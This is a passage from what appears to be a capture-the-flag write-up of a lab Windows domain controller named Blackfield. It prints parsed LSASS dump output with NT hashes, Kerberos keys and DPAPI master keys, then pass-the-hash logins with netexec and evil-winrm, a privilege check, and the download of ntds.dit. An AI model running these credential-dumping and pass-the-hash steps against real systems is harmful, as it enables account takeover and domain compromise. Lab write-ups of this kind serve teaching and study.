               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [59839]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 256940 (3ebac)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:59:13.068835+00:00  
sid S-1-5-18  
luid 256940  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.LOCAL  
  
== LogonSession ==  
authentication_id 136764 (2163c)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:58:27.052945+00:00  
sid S-1-5-18  
luid 136764  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.LOCAL  
  
== LogonSession ==  
authentication_id 134935 (20f17)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:58:26.834285+00:00  
sid S-1-5-18  
luid 134935  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.LOCAL  
  
== LogonSession ==  
authentication_id 997 (3e5)  
session_id 0  
username LOCAL SERVICE  
domainname NT AUTHORITY  
logon_server    
logon_time 2020-02-23T17:57:47.162285+00:00  
sid S-1-5-19  
luid 997  
       == Kerberos ==  
               Username:    
               Domain:    
  
== LogonSession ==  
authentication_id 24405 (5f55)  
session_id 0  
username UMFD-0  
domainname Font Driver Host  
logon_server    
logon_time 2020-02-23T17:57:46.569111+00:00  
sid S-1-5-96-0-0  
luid 24405  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [5f55]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [5f55]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 24294 (5ee6)  
session_id 0  
username UMFD-0  
domainname Font Driver Host  
logon_server    
logon_time 2020-02-23T17:57:46.554117+00:00  
sid S-1-5-96-0-0  
luid 24294  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [5ee6]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [5ee6]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 24282 (5eda)  
session_id 1  
username UMFD-1  
domainname Font Driver Host  
logon_server    
logon_time 2020-02-23T17:57:46.554117+00:00  
sid S-1-5-96-0-1  
luid 24282  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [5eda]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [5eda]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 22028 (560c)  
session_id 0  
username    
domainname    
logon_server    
logon_time 2020-02-23T17:57:44.959593+00:00  
sid None  
luid 22028  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
  
== LogonSession ==  
authentication_id 999 (3e7)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:57:44.913221+00:00  
sid S-1-5-18  
luid 999  
       == WDIGEST [3e7]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: dc01$  
               Domain: BLACKFIELD.LOCAL  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684  
       == WDIGEST [3e7]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == DPAPI [3e7]==  
               luid 999  
               key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9  
               masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616  
               sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd  
       == DPAPI [3e7]==  
               luid 999  
               key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654  
               masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9  
               sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477  
       == DPAPI [3e7]==  
               luid 999  
               key_guid 31632c55-7a7c-4c51-9065-65469950e94e  
               masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb  
               sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01  
       == DPAPI [3e7]==  
               luid 999  
               key_guid 7e0da320-072c-4b4a-969f-62087d9f9870  
               masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5  
               sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
```

we'll `printf` all of that into `lsass_parse.txt`.

```bash
>  grep -iE 'user|username|password|pass|hash' lsass_parse.txt  
username svc_backup  
               Username: svc_backup  
               username svc_backup  
               password None  
               password (hex)  
               Username: svc_backup  
               username svc_backup  
               password None  
               password (hex)  
username UMFD-2  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username UMFD-2  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username DC01$  
               Username: DC01$  
username Administrator  
               Username: Administrator  
               username Administrator  
               password None  
               password (hex)  
               Username: Administrator  
               username Administrator  
               password None  
               password (hex)  
username DC01$  
               Username: DC01$  
username DC01$  
               Username: DC01$  
username DWM-1  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username DWM-1  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username DC01$  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: dc01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username UMFD-1  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username svc_backup  
               Username: svc_backup  
               username svc_backup  
               password None  
               password (hex)  
               Username: svc_backup  
               username svc_backup  
               password None  
               password (hex)  
username DWM-2  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username DWM-2  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username DC01$  
               Username: DC01$  
username DC01$  
               Username: DC01$  
username DC01$  
               Username: DC01$  
username LOCAL SERVICE  
               Username:    
username UMFD-0  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username UMFD-0  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username UMFD-1  
               Username: DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: DC01$  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               username DC01$  
               password None  
               password (hex)  
username    
               Username: DC01$  
username DC01$  
               username DC01$  
               password None  
               password (hex)  
               Username: dc01$  
               username DC01$  
               password None  
               password (hex)
```

We got a hash for the second outliar we'd found in the user list : `svc_backup`.

We'll try `netexec` with `Pass-The-Hash` :

```bash
>  nxc smb 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
nxc winrm 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d    
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)    
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

And we got a shell !

```PowerShell
>  evil-winrm -i BLACKFIELD.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\svc_backup\Documents> type /Users/svc_backup/Desktop/user.txt  
3920bb31*************4b543
```

And the user flag.

We check our `privileges` and `groups` on the shell :

```PowerShell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeBackupPrivilege             Back up files and directories  Enabled  
SeRestorePrivilege            Restore files and directories  Enabled  
SeShutdownPrivilege           Shut down the system           Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                 Type             SID          Attributes  
========================================== ================ ============ ==================================================  
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group  
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

We have the `SeBackupPrivilege`. We use `/B` to `shadowcopy` the files into `\Temp\` on shell, then we download the files using `netexec` :

```PowerShell
*Evil-WinRM* PS C:\Windows\Temp> download ntds.dit /tmp/blackfield_ntds.dit  
   
                                          
Info: Downloading C:\Windows\Temp\ntds.dit to /tmp/blackfield_ntds.dit  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
